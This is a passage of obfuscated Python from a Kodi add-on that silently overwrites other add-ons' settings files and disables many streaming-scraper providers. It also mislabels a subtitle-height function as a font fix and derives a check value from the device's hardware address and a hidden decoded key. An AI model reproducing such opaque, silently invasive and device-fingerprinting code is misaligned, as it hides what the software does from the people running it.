		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1192
    with open (OO0O0OO000000O0OO ,'w')as OOOOOOO00O0O00000 :#line:1195
      OOOOOOO00O0O00000 .write (OOO0OOO0OO00O0OOO )#line:1196
def rdbuildinstallON ():#line:1199
    try :#line:1201
       OOO00OOOO00OO0OO0 =ADDONPATH +"/resources/rd/victory.xml"#line:1202
       O0O0O000OOO0O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1203
       copyfile (OOO00OOOO00OO0OO0 ,O0O0O000OOO0O0O00 )#line:1205
       OOO00OOOO00OO0OO0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1207
       O0O0O000OOO0O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1208
       copyfile (OOO00OOOO00OO0OO0 ,O0O0O000OOO0O0O00 )#line:1210
       OOO00OOOO00OO0OO0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1212
       O0O0O000OOO0O0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1213
       copyfile (OOO00OOOO00OO0OO0 ,O0O0O000OOO0O0O00 )#line:1215
       OOO00OOOO00OO0OO0 =ADDONPATH +"/resources/rd/Splash.png"#line:1218
       O0O0O000OOO0O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1219
       copyfile (OOO00OOOO00OO0OO0 ,O0O0O000OOO0O0O00 )#line:1221
    except :#line:1223
       pass #line:1224
def rdbuild ():#line:1234
	O00O0O000OO00O0OO =(ADDON .getSetting ("rdbuild"))#line:1235
	if O00O0O000OO00O0OO =='true':#line:1236
		O0O0OO0OO00OO0O00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1237
		O0O0OO0OO00OO0O00 .setSetting ('all_t','0')#line:1238
		O0O0OO0OO00OO0O00 .setSetting ('rd_menu_enable','false')#line:1239
		O0O0OO0OO00OO0O00 .setSetting ('magnet_bay','false')#line:1240
		O0O0OO0OO00OO0O00 .setSetting ('magnet_extra','false')#line:1241
		O0O0OO0OO00OO0O00 .setSetting ('rd_only','false')#line:1242
		O0O0OO0OO00OO0O00 .setSetting ('ftp','false')#line:1244
		O0O0OO0OO00OO0O00 .setSetting ('fp','false')#line:1245
		O0O0OO0OO00OO0O00 .setSetting ('filter_fp','false')#line:1246
		O0O0OO0OO00OO0O00 .setSetting ('fp_size_en','false')#line:1247
		O0O0OO0OO00OO0O00 .setSetting ('afdah','false')#line:1248
		O0O0OO0OO00OO0O00 .setSetting ('ap2s','false')#line:1249
		O0O0OO0OO00OO0O00 .setSetting ('cin','false')#line:1250
		O0O0OO0OO00OO0O00 .setSetting ('clv','false')#line:1251
		O0O0OO0OO00OO0O00 .setSetting ('cmv','false')#line:1252
		O0O0OO0OO00OO0O00 .setSetting ('dl20','false')#line:1253
		O0O0OO0OO00OO0O00 .setSetting ('esc','false')#line:1254
		O0O0OO0OO00OO0O00 .setSetting ('extra','false')#line:1255
		O0O0OO0OO00OO0O00 .setSetting ('film','false')#line:1256
		O0O0OO0OO00OO0O00 .setSetting ('fre','false')#line:1257
		O0O0OO0OO00OO0O00 .setSetting ('fxy','false')#line:1258
		O0O0OO0OO00OO0O00 .setSetting ('genv','false')#line:1259
		O0O0OO0OO00OO0O00 .setSetting ('getgo','false')#line:1260
		O0O0OO0OO00OO0O00 .setSetting ('gold','false')#line:1261
		O0O0OO0OO00OO0O00 .setSetting ('gona','false')#line:1262
		O0O0OO0OO00OO0O00 .setSetting ('hdmm','false')#line:1263
		O0O0OO0OO00OO0O00 .setSetting ('hdt','false')#line:1264
		O0O0OO0OO00OO0O00 .setSetting ('icy','false')#line:1265
		O0O0OO0OO00OO0O00 .setSetting ('ind','false')#line:1266
		O0O0OO0OO00OO0O00 .setSetting ('iwi','false')#line:1267
		O0O0OO0OO00OO0O00 .setSetting ('jen_free','false')#line:1268
		O0O0OO0OO00OO0O00 .setSetting ('kiss','false')#line:1269
		O0O0OO0OO00OO0O00 .setSetting ('lavin','false')#line:1270
		O0O0OO0OO00OO0O00 .setSetting ('los','false')#line:1271
		O0O0OO0OO00OO0O00 .setSetting ('m4u','false')#line:1272
		O0O0OO0OO00OO0O00 .setSetting ('mesh','false')#line:1273
		O0O0OO0OO00OO0O00 .setSetting ('mf','false')#line:1274
		O0O0OO0OO00OO0O00 .setSetting ('mkvc','false')#line:1275
		O0O0OO0OO00OO0O00 .setSetting ('mjy','false')#line:1276
		O0O0OO0OO00OO0O00 .setSetting ('hdonline','false')#line:1277
		O0O0OO0OO00OO0O00 .setSetting ('moviex','false')#line:1278
		O0O0OO0OO00OO0O00 .setSetting ('mpr','false')#line:1279
		O0O0OO0OO00OO0O00 .setSetting ('mvg','false')#line:1280
		O0O0OO0OO00OO0O00 .setSetting ('mvl','false')#line:1281
		O0O0OO0OO00OO0O00 .setSetting ('mvs','false')#line:1282
		O0O0OO0OO00OO0O00 .setSetting ('myeg','false')#line:1283
		O0O0OO0OO00OO0O00 .setSetting ('ninja','false')#line:1284
		O0O0OO0OO00OO0O00 .setSetting ('odb','false')#line:1285
		O0O0OO0OO00OO0O00 .setSetting ('ophd','false')#line:1286
		O0O0OO0OO00OO0O00 .setSetting ('pks','false')#line:1287
		O0O0OO0OO00OO0O00 .setSetting ('prf','false')#line:1288
		O0O0OO0OO00OO0O00 .setSetting ('put18','false')#line:1289
		O0O0OO0OO00OO0O00 .setSetting ('req','false')#line:1290
		O0O0OO0OO00OO0O00 .setSetting ('rftv','false')#line:1291
		O0O0OO0OO00OO0O00 .setSetting ('rltv','false')#line:1292
		O0O0OO0OO00OO0O00 .setSetting ('sc','false')#line:1293
		O0O0OO0OO00OO0O00 .setSetting ('seehd','false')#line:1294
		O0O0OO0OO00OO0O00 .setSetting ('showbox','false')#line:1295
		O0O0OO0OO00OO0O00 .setSetting ('shuid','false')#line:1296
		O0O0OO0OO00OO0O00 .setSetting ('sil_gh','false')#line:1297
		O0O0OO0OO00OO0O00 .setSetting ('spv','false')#line:1298
		O0O0OO0OO00OO0O00 .setSetting ('subs','false')#line:1299
		O0O0OO0OO00OO0O00 .setSetting ('tvs','false')#line:1300
		O0O0OO0OO00OO0O00 .setSetting ('tw','false')#line:1301
		O0O0OO0OO00OO0O00 .setSetting ('upto','false')#line:1302
		O0O0OO0OO00OO0O00 .setSetting ('vel','false')#line:1303
		O0O0OO0OO00OO0O00 .setSetting ('vex','false')#line:1304
		O0O0OO0OO00OO0O00 .setSetting ('vidc','false')#line:1305
		O0O0OO0OO00OO0O00 .setSetting ('w4hd','false')#line:1306
		O0O0OO0OO00OO0O00 .setSetting ('wav','false')#line:1307
		O0O0OO0OO00OO0O00 .setSetting ('wf','false')#line:1308
		O0O0OO0OO00OO0O00 .setSetting ('wse','false')#line:1309
		O0O0OO0OO00OO0O00 .setSetting ('wss','false')#line:1310
		O0O0OO0OO00OO0O00 .setSetting ('wsse','false')#line:1311
		O0O0OO0OO00OO0O00 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1312
		O0O0OO0OO00OO0O00 .setSetting ('debrid.only','true')#line:1313
		O0O0OO0OO00OO0O00 .setSetting ('hosts.captcha','false')#line:1314
		O0O0OO0OO00OO0O00 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1315
		O0O0OO0OO00OO0O00 .setSetting ('provider.123moviehd','false')#line:1316
		O0O0OO0OO00OO0O00 .setSetting ('provider.300mbdownload','false')#line:1317
		O0O0OO0OO00OO0O00 .setSetting ('provider.alltube','false')#line:1318
		O0O0OO0OO00OO0O00 .setSetting ('provider.allucde','false')#line:1319
		O0O0OO0OO00OO0O00 .setSetting ('provider.animebase','false')#line:1320
		O0O0OO0OO00OO0O00 .setSetting ('provider.animeloads','false')#line:1321
		O0O0OO0OO00OO0O00 .setSetting ('provider.animetoon','false')#line:1322
		O0O0OO0OO00OO0O00 .setSetting ('provider.bnwmovies','false')#line:1323
		O0O0OO0OO00OO0O00 .setSetting ('provider.boxfilm','false')#line:1324
		O0O0OO0OO00OO0O00 .setSetting ('provider.bs','false')#line:1325
		O0O0OO0OO00OO0O00 .setSetting ('provider.cartoonhd','false')#line:1326
		O0O0OO0OO00OO0O00 .setSetting ('provider.cdahd','false')#line:1327
		O0O0OO0OO00OO0O00 .setSetting ('provider.cdax','false')#line:1328
		O0O0OO0OO00OO0O00 .setSetting ('provider.cine','false')#line:1329
		O0O0OO0OO00OO0O00 .setSetting ('provider.cinenator','false')#line:1330
		O0O0OO0OO00OO0O00 .setSetting ('provider.cmovieshdbz','false')#line:1331
		O0O0OO0OO00OO0O00 .setSetting ('provider.coolmoviezone','false')#line:1332
		O0O0OO0OO00OO0O00 .setSetting ('provider.ddl','false')#line:1333
		O0O0OO0OO00OO0O00 .setSetting ('provider.deepmovie','false')#line:1334
		O0O0OO0OO00OO0O00 .setSetting ('provider.ekinomaniak','false')#line:1335
		O0O0OO0OO00OO0O00 .setSetting ('provider.ekinotv','false')#line:1336
		O0O0OO0OO00OO0O00 .setSetting ('provider.filiser','false')#line:1337
		O0O0OO0OO00OO0O00 .setSetting ('provider.filmpalast','false')#line:1338
		O0O0OO0OO00OO0O00 .setSetting ('provider.filmwebbooster','false')#line:1339
		O0O0OO0OO00OO0O00 .setSetting ('provider.filmxy','false')#line:1340
		O0O0OO0OO00OO0O00 .setSetting ('provider.fmovies','false')#line:1341
		O0O0OO0OO00OO0O00 .setSetting ('provider.foxx','false')#line:1342
		O0O0OO0OO00OO0O00 .setSetting ('provider.freefmovies','false')#line:1343
		O0O0OO0OO00OO0O00 .setSetting ('provider.freeputlocker','false')#line:1344
		O0O0OO0OO00OO0O00 .setSetting ('provider.furk','false')#line:1345
		O0O0OO0OO00OO0O00 .setSetting ('provider.gamatotv','false')#line:1346
		O0O0OO0OO00OO0O00 .setSetting ('provider.gogoanime','false')#line:1347
		O0O0OO0OO00OO0O00 .setSetting ('provider.gowatchseries','false')#line:1348
		O0O0OO0OO00OO0O00 .setSetting ('provider.hackimdb','false')#line:1349
		O0O0OO0OO00OO0O00 .setSetting ('provider.hdfilme','false')#line:1350
		O0O0OO0OO00OO0O00 .setSetting ('provider.hdmto','false')#line:1351
		O0O0OO0OO00OO0O00 .setSetting ('provider.hdpopcorns','false')#line:1352
		O0O0OO0OO00OO0O00 .setSetting ('provider.hdstreams','false')#line:1353
		O0O0OO0OO00OO0O00 .setSetting ('provider.horrorkino','false')#line:1355
		O0O0OO0OO00OO0O00 .setSetting ('provider.iitv','false')#line:1356
		O0O0OO0OO00OO0O00 .setSetting ('provider.iload','false')#line:1357
		O0O0OO0OO00OO0O00 .setSetting ('provider.iwaatch','false')#line:1358
		O0O0OO0OO00OO0O00 .setSetting ('provider.kinodogs','false')#line:1359
		O0O0OO0OO00OO0O00 .setSetting ('provider.kinoking','false')#line:1360
		O0O0OO0OO00OO0O00 .setSetting ('provider.kinow','false')#line:1361
		O0O0OO0OO00OO0O00 .setSetting ('provider.kinox','false')#line:1362
		O0O0OO0OO00OO0O00 .setSetting ('provider.lichtspielhaus','false')#line:1363
		O0O0OO0OO00OO0O00 .setSetting ('provider.liomenoi','false')#line:1364
		O0O0OO0OO00OO0O00 .setSetting ('provider.magnetdl','false')#line:1367
		O0O0OO0OO00OO0O00 .setSetting ('provider.megapelistv','false')#line:1368
		O0O0OO0OO00OO0O00 .setSetting ('provider.movie2k-ac','false')#line:1369
		O0O0OO0OO00OO0O00 .setSetting ('provider.movie2k-ag','false')#line:1370
		O0O0OO0OO00OO0O00 .setSetting ('provider.movie2z','false')#line:1371
		O0O0OO0OO00OO0O00 .setSetting ('provider.movie4k','false')#line:1372
		O0O0OO0OO00OO0O00 .setSetting ('provider.movie4kis','false')#line:1373
		O0O0OO0OO00OO0O00 .setSetting ('provider.movieneo','false')#line:1374
		O0O0OO0OO00OO0O00 .setSetting ('provider.moviesever','false')#line:1375
		O0O0OO0OO00OO0O00 .setSetting ('provider.movietown','false')#line:1376
		O0O0OO0OO00OO0O00 .setSetting ('provider.mvrls','false')#line:1378
		O0O0OO0OO00OO0O00 .setSetting ('provider.netzkino','false')#line:1379
		O0O0OO0OO00OO0O00 .setSetting ('provider.odb','false')#line:1380
		O0O0OO0OO00OO0O00 .setSetting ('provider.openkatalog','false')#line:1381
		O0O0OO0OO00OO0O00 .setSetting ('provider.ororo','false')#line:1382
		O0O0OO0OO00OO0O00 .setSetting ('provider.paczamy','false')#line:1383
		O0O0OO0OO00OO0O00 .setSetting ('provider.peliculasdk','false')#line:1384
		O0O0OO0OO00OO0O00 .setSetting ('provider.pelisplustv','false')#line:1385
		O0O0OO0OO00OO0O00 .setSetting ('provider.pepecine','false')#line:1386
		O0O0OO0OO00OO0O00 .setSetting ('provider.primewire','false')#line:1387
		O0O0OO0OO00OO0O00 .setSetting ('provider.projectfreetv','false')#line:1388
		O0O0OO0OO00OO0O00 .setSetting ('provider.proxer','false')#line:1389
		O0O0OO0OO00OO0O00 .setSetting ('provider.pureanime','false')#line:1390
		O0O0OO0OO00OO0O00 .setSetting ('provider.putlocker','false')#line:1391
		O0O0OO0OO00OO0O00 .setSetting ('provider.putlockerfree','false')#line:1392
		O0O0OO0OO00OO0O00 .setSetting ('provider.reddit','false')#line:1393
		O0O0OO0OO00OO0O00 .setSetting ('provider.cartoonwire','false')#line:1394
		O0O0OO0OO00OO0O00 .setSetting ('provider.seehd','false')#line:1395
		O0O0OO0OO00OO0O00 .setSetting ('provider.segos','false')#line:1396
		O0O0OO0OO00OO0O00 .setSetting ('provider.serienstream','false')#line:1397
		O0O0OO0OO00OO0O00 .setSetting ('provider.series9','false')#line:1398
		O0O0OO0OO00OO0O00 .setSetting ('provider.seriesever','false')#line:1399
		O0O0OO0OO00OO0O00 .setSetting ('provider.seriesonline','false')#line:1400
		O0O0OO0OO00OO0O00 .setSetting ('provider.seriespapaya','false')#line:1401
		O0O0OO0OO00OO0O00 .setSetting ('provider.sezonlukdizi','false')#line:1402
		O0O0OO0OO00OO0O00 .setSetting ('provider.solarmovie','false')#line:1403
		O0O0OO0OO00OO0O00 .setSetting ('provider.solarmoviez','false')#line:1404
		O0O0OO0OO00OO0O00 .setSetting ('provider.stream-to','false')#line:1405
		O0O0OO0OO00OO0O00 .setSetting ('provider.streamdream','false')#line:1406
		O0O0OO0OO00OO0O00 .setSetting ('provider.streamflix','false')#line:1407
		O0O0OO0OO00OO0O00 .setSetting ('provider.streamit','false')#line:1408
		O0O0OO0OO00OO0O00 .setSetting ('provider.swatchseries','false')#line:1409
		O0O0OO0OO00OO0O00 .setSetting ('provider.szukajkatv','false')#line:1410
		O0O0OO0OO00OO0O00 .setSetting ('provider.tainiesonline','false')#line:1411
		O0O0OO0OO00OO0O00 .setSetting ('provider.tainiomania','false')#line:1412
		O0O0OO0OO00OO0O00 .setSetting ('provider.tata','false')#line:1415
		O0O0OO0OO00OO0O00 .setSetting ('provider.trt','false')#line:1416
		O0O0OO0OO00OO0O00 .setSetting ('provider.tvbox','false')#line:1417
		O0O0OO0OO00OO0O00 .setSetting ('provider.ultrahd','false')#line:1418
		O0O0OO0OO00OO0O00 .setSetting ('provider.video4k','false')#line:1419
		O0O0OO0OO00OO0O00 .setSetting ('provider.vidics','false')#line:1420
		O0O0OO0OO00OO0O00 .setSetting ('provider.view4u','false')#line:1421
		O0O0OO0OO00OO0O00 .setSetting ('provider.watchseries','false')#line:1422
		O0O0OO0OO00OO0O00 .setSetting ('provider.xrysoi','false')#line:1423
		O0O0OO0OO00OO0O00 .setSetting ('provider.library','false')#line:1424
def fixfont ():#line:1427
	O0OO000OO00OO0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1428
	O0O000O000OOOO0O0 =json .loads (O0OO000OO00OO0OOO );#line:1430
	O0O00O000OO0OOOOO =O0O000O000OOOO0O0 ["result"]["settings"]#line:1431
	O0000O0O0000O0000 =[O0000O0OO0O0OOOO0 for O0000O0OO0O0OOOO0 in O0O00O000OO0OOOOO if O0000O0OO0O0OOOO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1433
	O00OOO0OO0OO0OO0O =O0000O0O0000O0000 ["options"];#line:1434
	OO0O000OOOO00O0OO =O0000O0O0000O0000 ["value"];#line:1435
	O000O0O0O00OO0O0O =[OO000OOO0OOOO0O0O for (OO000OOO0OOOO0O0O ,OO00OOOOOO00000OO )in enumerate (O00OOO0OO0OO0OO0O )if OO00OOOOOO00000OO ["value"]==OO0O000OOOO00O0OO ][0 ];#line:1437
	O000OOO0OO000O00O =(O000O0O0O00OO0O0O +1 )%len (O00OOO0OO0OO0OO0O )#line:1439
	OOOOO00OOOO00OO0O =O00OOO0OO0OO0OO0O [O000OOO0OO000O00O ]["value"]#line:1441
	O00OO00OO0O000OOO =O00OOO0OO0OO0OO0O [O000OOO0OO000O00O ]["label"]#line:1442
	O0OO00O0O000000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1444
	try :#line:1446
		OO00O0OO0OOO00O00 =json .loads (O0OO00O0O000000O0 );#line:1447
		if OO00O0OO0OOO00O00 ["result"]!=True :#line:1449
			raise Exception #line:1450
	except :#line:1451
		sys .stderr .write ("Error switching audio output device")#line:1452
		raise Exception #line:1453
def parseDOM2 (O000O0O0O0OOO0000 ,name =u"",attrs ={},ret =False ):#line:1454
	if isinstance (O000O0O0O0OOO0000 ,str ):#line:1457
		try :#line:1458
			O000O0O0O0OOO0000 =[O000O0O0O0OOO0000 .decode ("utf-8")]#line:1459
		except :#line:1460
			O000O0O0O0OOO0000 =[O000O0O0O0OOO0000 ]#line:1461
	elif isinstance (O000O0O0O0OOO0000 ,unicode ):#line:1462
		O000O0O0O0OOO0000 =[O000O0O0O0OOO0000 ]#line:1463
	elif not isinstance (O000O0O0O0OOO0000 ,list ):#line:1464
		return u""#line:1465
	if not name .strip ():#line:1467
		return u""#line:1468
	O000OOO0O00000000 =[]#line:1470
	for O0OOO00O0O0OOOOO0 in O000O0O0O0OOO0000 :#line:1471
		OOO00O000O0OOOOO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OOO00O0O0OOOOO0 )#line:1472
		for O0000O00O0O0O0OO0 in OOO00O000O0OOOOO0 :#line:1473
			O0OOO00O0O0OOOOO0 =O0OOO00O0O0OOOOO0 .replace (O0000O00O0O0O0OO0 ,O0000O00O0O0O0OO0 .replace ("\n"," "))#line:1474
		OOOO000OOO0000000 =[]#line:1476
		for OO000OO00OOO000OO in attrs :#line:1477
			OO0OOOOOOO0OOO00O =re .compile ('(<'+name +'[^>]*?(?:'+OO000OO00OOO000OO +'=[\'"]'+attrs [OO000OO00OOO000OO ]+'[\'"].*?>))',re .M |re .S ).findall (O0OOO00O0O0OOOOO0 )#line:1478
			if len (OO0OOOOOOO0OOO00O )==0 and attrs [OO000OO00OOO000OO ].find (" ")==-1 :#line:1479
				OO0OOOOOOO0OOO00O =re .compile ('(<'+name +'[^>]*?(?:'+OO000OO00OOO000OO +'='+attrs [OO000OO00OOO000OO ]+'.*?>))',re .M |re .S ).findall (O0OOO00O0O0OOOOO0 )#line:1480
			if len (OOOO000OOO0000000 )==0 :#line:1482
				OOOO000OOO0000000 =OO0OOOOOOO0OOO00O #line:1483
				OO0OOOOOOO0OOO00O =[]#line:1484
			else :#line:1485
				O0OOO0000000O0O00 =range (len (OOOO000OOO0000000 ))#line:1486
				O0OOO0000000O0O00 .reverse ()#line:1487
				for O000OOOOOO000O0O0 in O0OOO0000000O0O00 :#line:1488
					if not OOOO000OOO0000000 [O000OOOOOO000O0O0 ]in OO0OOOOOOO0OOO00O :#line:1489
						del (OOOO000OOO0000000 [O000OOOOOO000O0O0 ])#line:1490
		if len (OOOO000OOO0000000 )==0 and attrs =={}:#line:1492
			OOOO000OOO0000000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OOO00O0O0OOOOO0 )#line:1493
			if len (OOOO000OOO0000000 )==0 :#line:1494
				OOOO000OOO0000000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OOO00O0O0OOOOO0 )#line:1495
		if isinstance (ret ,str ):#line:1497
			OO0OOOOOOO0OOO00O =[]#line:1498
			for O0000O00O0O0O0OO0 in OOOO000OOO0000000 :#line:1499
				OO00OOO0O000O0O00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0000O00O0O0O0OO0 )#line:1500
				if len (OO00OOO0O000O0O00 )==0 :#line:1501
					OO00OOO0O000O0O00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0000O00O0O0O0OO0 )#line:1502
				for O00OOO0O000OOO0OO in OO00OOO0O000O0O00 :#line:1503
					OO0O0000OO00OO00O =O00OOO0O000OOO0OO [0 ]#line:1504
					if OO0O0000OO00OO00O in "'\"":#line:1505
						if O00OOO0O000OOO0OO .find ('='+OO0O0000OO00OO00O ,O00OOO0O000OOO0OO .find (OO0O0000OO00OO00O ,1 ))>-1 :#line:1506
							O00OOO0O000OOO0OO =O00OOO0O000OOO0OO [:O00OOO0O000OOO0OO .find ('='+OO0O0000OO00OO00O ,O00OOO0O000OOO0OO .find (OO0O0000OO00OO00O ,1 ))]#line:1507
						if O00OOO0O000OOO0OO .rfind (OO0O0000OO00OO00O ,1 )>-1 :#line:1509
							O00OOO0O000OOO0OO =O00OOO0O000OOO0OO [1 :O00OOO0O000OOO0OO .rfind (OO0O0000OO00OO00O )]#line:1510
					else :#line:1511
						if O00OOO0O000OOO0OO .find (" ")>0 :#line:1512
							O00OOO0O000OOO0OO =O00OOO0O000OOO0OO [:O00OOO0O000OOO0OO .find (" ")]#line:1513
						elif O00OOO0O000OOO0OO .find ("/")>0 :#line:1514
							O00OOO0O000OOO0OO =O00OOO0O000OOO0OO [:O00OOO0O000OOO0OO .find ("/")]#line:1515
						elif O00OOO0O000OOO0OO .find (">")>0 :#line:1516
							O00OOO0O000OOO0OO =O00OOO0O000OOO0OO [:O00OOO0O000OOO0OO .find (">")]#line:1517
					OO0OOOOOOO0OOO00O .append (O00OOO0O000OOO0OO .strip ())#line:1519
			OOOO000OOO0000000 =OO0OOOOOOO0OOO00O #line:1520
		else :#line:1521
			OO0OOOOOOO0OOO00O =[]#line:1522
			for O0000O00O0O0O0OO0 in OOOO000OOO0000000 :#line:1523
				O00OO000OOOO00OO0 =u"</"+name #line:1524
				OOOOO00O00OOOOO00 =O0OOO00O0O0OOOOO0 .find (O0000O00O0O0O0OO0 )#line:1526
				O0000OOO00O000OOO =O0OOO00O0O0OOOOO0 .find (O00OO000OOOO00OO0 ,OOOOO00O00OOOOO00 )#line:1527
				O0OO0OOOO00O0O0OO =O0OOO00O0O0OOOOO0 .find ("<"+name ,OOOOO00O00OOOOO00 +1 )#line:1528
				while O0OO0OOOO00O0O0OO <O0000OOO00O000OOO and O0OO0OOOO00O0O0OO !=-1 :#line:1530
					O0OOO0O0OO0O00OOO =O0OOO00O0O0OOOOO0 .find (O00OO000OOOO00OO0 ,O0000OOO00O000OOO +len (O00OO000OOOO00OO0 ))#line:1531
					if O0OOO0O0OO0O00OOO !=-1 :#line:1532
						O0000OOO00O000OOO =O0OOO0O0OO0O00OOO #line:1533
					O0OO0OOOO00O0O0OO =O0OOO00O0O0OOOOO0 .find ("<"+name ,O0OO0OOOO00O0O0OO +1 )#line:1534
				if OOOOO00O00OOOOO00 ==-1 and O0000OOO00O000OOO ==-1 :#line:1536
					OOOO000O0O000O000 =u""#line:1537
				elif OOOOO00O00OOOOO00 >-1 and O0000OOO00O000OOO >-1 :#line:1538
					OOOO000O0O000O000 =O0OOO00O0O0OOOOO0 [OOOOO00O00OOOOO00 +len (O0000O00O0O0O0OO0 ):O0000OOO00O000OOO ]#line:1539
				elif O0000OOO00O000OOO >-1 :#line:1540
					OOOO000O0O000O000 =O0OOO00O0O0OOOOO0 [:O0000OOO00O000OOO ]#line:1541
				elif OOOOO00O00OOOOO00 >-1 :#line:1542
					OOOO000O0O000O000 =O0OOO00O0O0OOOOO0 [OOOOO00O00OOOOO00 +len (O0000O00O0O0O0OO0 ):]#line:1543
				if ret :#line:1545
					O00OO000OOOO00OO0 =O0OOO00O0O0OOOOO0 [O0000OOO00O000OOO :O0OOO00O0O0OOOOO0 .find (">",O0OOO00O0O0OOOOO0 .find (O00OO000OOOO00OO0 ))+1 ]#line:1546
					OOOO000O0O000O000 =O0000O00O0O0O0OO0 +OOOO000O0O000O000 +O00OO000OOOO00OO0 #line:1547
				O0OOO00O0O0OOOOO0 =O0OOO00O0O0OOOOO0 [O0OOO00O0O0OOOOO0 .find (OOOO000O0O000O000 ,O0OOO00O0O0OOOOO0 .find (O0000O00O0O0O0OO0 ))+len (OOOO000O0O000O000 ):]#line:1549
				OO0OOOOOOO0OOO00O .append (OOOO000O0O000O000 )#line:1550
			OOOO000OOO0000000 =OO0OOOOOOO0OOO00O #line:1551
		O000OOO0O00000000 +=OOOO000OOO0000000 #line:1552
	return O000OOO0O00000000 #line:1554
def addItem (OO0O00OO0O00O000O ,OOO0O0OO0O0OO00OO ,O0OOO0OOO000O0OO0 ,OO00OOO000OO0O000 ,OO0OOOOO0OOOO0O0O ,description =None ):#line:1556
	if description ==None :description =''#line:1557
	description ='[COLOR white]'+description +'[/COLOR]'#line:1558
	O0O000O00OO00OOO0 =sys .argv [0 ]+"?url="+urllib .quote_plus (OOO0O0OO0O0OO00OO )+"&mode="+str (O0OOO0OOO000O0OO0 )+"&name="+urllib .quote_plus (OO0O00OO0O00O000O )+"&iconimage="+urllib .quote_plus (OO00OOO000OO0O000 )+"&fanart="+urllib .quote_plus (OO0OOOOO0OOOO0O0O )#line:1559
	OO0000O0OO00O0OO0 =True #line:1560
	OOOO00O0O0OOO0OO0 =xbmcgui .ListItem (OO0O00OO0O00O000O ,iconImage =OO00OOO000OO0O000 ,thumbnailImage =OO00OOO000OO0O000 )#line:1561
	OOOO00O0O0OOO0OO0 .setInfo (type ="Video",infoLabels ={"Title":OO0O00OO0O00O000O ,"Plot":description })#line:1562
	OOOO00O0O0OOO0OO0 .setProperty ("fanart_Image",OO0OOOOO0OOOO0O0O )#line:1563
	OOOO00O0O0OOO0OO0 .setProperty ("icon_Image",OO00OOO000OO0O000 )#line:1564
	OO0000O0OO00O0OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O000O00OO00OOO0 ,listitem =OOOO00O0O0OOO0OO0 ,isFolder =False )#line:1565
	return OO0000O0OO00O0OO0 #line:1566
def get_params ():#line:1568
		O0OO0OO000OOO0OOO =[]#line:1569
		OOOOO000O0OOOO0OO =sys .argv [2 ]#line:1570
		if len (OOOOO000O0OOOO0OO )>=2 :#line:1571
				OOOOOOOO00OOO0O00 =sys .argv [2 ]#line:1572
				OO00OO000OOO0O000 =OOOOOOOO00OOO0O00 .replace ('?','')#line:1573
				if (OOOOOOOO00OOO0O00 [len (OOOOOOOO00OOO0O00 )-1 ]=='/'):#line:1574
						OOOOOOOO00OOO0O00 =OOOOOOOO00OOO0O00 [0 :len (OOOOOOOO00OOO0O00 )-2 ]#line:1575
				O00O00OOO000O0O0O =OO00OO000OOO0O000 .split ('&')#line:1576
				O0OO0OO000OOO0OOO ={}#line:1577
				for OOO0O00OO00OO00O0 in range (len (O00O00OOO000O0O0O )):#line:1578
						OOO0OOOO000OO00O0 ={}#line:1579
						OOO0OOOO000OO00O0 =O00O00OOO000O0O0O [OOO0O00OO00OO00O0 ].split ('=')#line:1580
						if (len (OOO0OOOO000OO00O0 ))==2 :#line:1581
								O0OO0OO000OOO0OOO [OOO0OOOO000OO00O0 [0 ]]=OOO0OOOO000OO00O0 [1 ]#line:1582
		return O0OO0OO000OOO0OOO #line:1584
def decode (OOO00OOO00O000OO0 ,O0O0OO000OO0000OO ):#line:1589
    import base64 #line:1590
    OOO00OO00OOOOO000 =[]#line:1591
    if (len (OOO00OOO00O000OO0 ))!=4 :#line:1593
     return 10 #line:1594
    O0O0OO000OO0000OO =base64 .urlsafe_b64decode (O0O0OO000OO0000OO )#line:1595
    for O0O0OOO0O000O0O00 in range (len (O0O0OO000OO0000OO )):#line:1597
        O0OO00OO0O00OO0OO =OOO00OOO00O000OO0 [O0O0OOO0O000O0O00 %len (OOO00OOO00O000OO0 )]#line:1598
        O0O0O000000O0O0O0 =chr ((256 +ord (O0O0OO000OO0000OO [O0O0OOO0O000O0O00 ])-ord (O0OO00OO0O00OO0OO ))%256 )#line:1599
        OOO00OO00OOOOO000 .append (O0O0O000000O0O0O0 )#line:1600
    return "".join (OOO00OO00OOOOO000 )#line:1601
def tmdb_list (OOOO0O0O000OOO00O ):#line:1602
    O00O0OO0O0O0O0O00 =decode ("7643",OOOO0O0O000OOO00O )#line:1605
    return int (O00O0OO0O0O0O0O00 )#line:1608
def u_list (OO00000O00OOO000O ):#line:1609
    from math import sqrt #line:1611
    OO00000OO0O0OO00O =tmdb_list (TMDB_NEW_API )#line:1612
    OO0OOO000O0O00000 =str ((getHwAddr ('eth0'))*OO00000OO0O0OO00O )#line:1614
    O0000OO00000O00O0 =int (OO0OOO000O0O00000 [1 ]+OO0OOO000O0O00000 [2 ]+OO0OOO000O0O00000 [5 ]+OO0OOO000O0O00000 [7 ])#line:1615
    O000OOO00O0OOOOOO =(ADDON .getSetting ("pass"))#line:1617
